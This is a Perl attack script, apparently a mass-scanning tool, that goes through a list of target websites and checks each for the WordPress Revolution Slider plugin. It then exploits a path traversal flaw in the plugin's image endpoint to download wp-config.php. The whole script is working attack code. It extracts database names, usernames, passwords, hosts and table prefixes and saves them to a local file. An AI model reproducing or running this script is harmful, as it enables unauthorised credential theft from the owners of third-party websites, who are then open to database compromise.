#!/usr/bin/perl
#github:AlHikamWolf
use LWP::UserAgent;
use HTTP::Response;
use Term::ANSIColor;
use URI::URL;
my $ua = LWP::UserAgent->new;
$ua->timeout(10);
sub banner() {
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
print color('white');
print q(
	 _____ _ _____ _ _             _ _ _     _ ___ 
	|  _  | |  |  |_| |_ ___ _____| | | |___| |  _|
	|     | |     | | '_| .'|     | | | | . | |  _|
	|__|__|_|__|__|_|_,_|__,|_|_|_|_____|___|_|_|  
		[WP] RevSlider Config Killers
);}
banner();
unless ($list) { lulz(); }
sub lulz { print color('green'),"\n	Targets: ";
$list=<STDIN>;
open (THETARGET, "<$list"); @TARGETS = <THETARGET>; close THETARGET;
$link=$#TARGETS + 1; print color('reset');
OUTER: foreach $site(@TARGETS){ chomp($site); $a++; cms();}

#SCANNING
sub cms(){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (15);
my $cms = $ua->get("http://$site")->content;
if($cms =~/\/revslider\//) {
print color('yellow'),"\n * ";print color('white'),"http://$site\n";print color('reset'); rvsldrgetconf();}
else{ print color('red'),"\n X ";print color('white'),"http://$site\n";print color('reset');}}

#REVSLIDER
sub rvsldrgetconf{
$url = "http://$site/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";
$resp = $ua->request(HTTP::Request->new(GET => $url ));
$conttt = $resp->content;
if($conttt =~ /DB_NAME/){ print color('yellow')," Scanning.. "; print color('green'),"CONFIG FOUND!\n"; print color('reset');
if($conttt =~ /'DB_NAME', '(.*?)'/){ print " DB_NAME : $1"; open(save, '>>db.txt'); print save "URL : $url\n"; print save "DB_NAME : $1\n";}
if($conttt =~ /'DB_USER', '(.*?)'/){ print "\n DB_USER : $1"; print save "DB_USER : $1\n";}
if($conttt =~ /'DB_PASSWORD', '(.*?)'/){ print "\n DB_PASSWORD : $1"; print save "DB_PASSWORD : $1\n";}
if($conttt =~ /'DB_HOST', '(.*?)'/){ print "\n DB_HOST : $1"; print save "DB_HOST : $1\n";}
if($conttt =~ /prefix  = '(.*?)'/){ print "\n Prefix : $1\n"; print save "Prefix : $1\n\n";}
close(save);
}else{ print color('yellow')," Scanning.. ";print color('red'),"CONFIG NOT FOUND!\n"; print color('reset');}}}
